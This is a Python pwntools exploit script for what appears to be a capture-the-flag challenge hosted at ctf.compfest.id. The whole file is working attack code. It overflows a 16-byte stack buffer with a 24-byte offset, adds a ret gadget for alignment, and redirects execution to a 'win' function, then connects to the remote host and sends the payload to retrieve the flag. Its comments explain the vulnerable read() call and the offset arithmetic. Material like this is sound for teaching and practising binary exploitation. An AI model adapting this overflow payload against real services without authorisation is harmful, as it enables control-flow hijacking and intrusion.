# This script requires the 'pwntools' library.
# You can install it by running: pip install pwntools

from pwn import *

# --- Configuration ---

# The address of the 'win' function, found in the decompiled code.
# //----- (0000000000401186) ----------------------------------------------------
# int win()
WIN_FUNCTION_ADDR = 0x401186

# Address of a 'ret' gadget. This is needed for 16-byte stack alignment
# on 64-bit systems. We are trying a different empty function as a gadget,
# as the previous one did not work.
# The 'term_proc' function at 0x40126C is also empty and just returns.
RET_GADGET_ADDR = 0x40126C

# The target server details from the challenge description.
HOST = 'ctf.compfest.id'
PORT = 7004

# --- Exploit Logic ---

# The vulnerability lies in the 'vuln' function:
# _BYTE buf[16]; // [rsp+0h] [rbp-10h] BYREF
# ...
# return read(0, buf, 0x20u);
#
# It reads 0x20 (32) bytes into a 16-byte buffer.
# The distance from the start of our buffer 'buf' to the return address is
# 16 bytes (for the buffer itself) + 8 bytes (for the saved rbp register).
# Total offset = 24 bytes.

offset_to_return_addr = 24

# We build the payload:
# 1. 24 bytes of junk data to fill the buffer and overwrite the saved rbp.
# 2. The address of a 'ret' gadget to align the stack.
# 3. The address of the 'win' function.
payload = b'A' * offset_to_return_addr
payload += p64(RET_GADGET_ADDR)
payload += p64(WIN_FUNCTION_ADDR)

log.info(f"Payload constructed: {payload}")

# --- Connection and Interaction ---

try:
    # Connect to the remote server
    p = remote(HOST, PORT)

    # Wait for the prompt ">> "
    prompt = p.recvuntil(b'>> ')
    log.info(f"Received prompt: {prompt.decode().strip()}")

    # Send our malicious payload
    p.sendline(payload)
    log.success("Payload sent!")

    # The 'win' function should now execute and print the flag.
    # We receive all the output until the connection closes.
    flag = p.recvall(timeout=2).decode()

    # Print the result
    print("\n" + "="*30)
    print("      Exploit Successful!      ")
    print("="*30)
    print(f"\nFlag:\n{flag.strip()}")

except Exception as e:
    log.error(f"An error occurred: {e}")

finally:
    # Close the connection
    if 'p' in locals() and p:
        p.close()
